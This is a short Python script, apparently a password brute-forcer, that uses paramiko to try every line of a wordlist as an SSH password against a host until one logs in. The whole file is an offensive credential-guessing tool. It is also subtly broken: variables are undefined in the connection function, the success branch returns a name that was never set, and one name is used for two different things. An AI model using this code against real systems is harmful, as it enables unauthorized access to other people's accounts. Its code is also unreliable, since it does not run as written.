import paramiko, sys, os, socket

def ssh_connect(password, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port = 22, username = username, password = password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error:
        code = 2

    ssh.close()
    return code


def ssh(host_address, username, password_file):
    with open(password_file, 'r') as file:
        for line in file.readlines():
            response = ssh_connect(line.strip())
            if response == 0:
                return password
            elif response == 2:
                return None
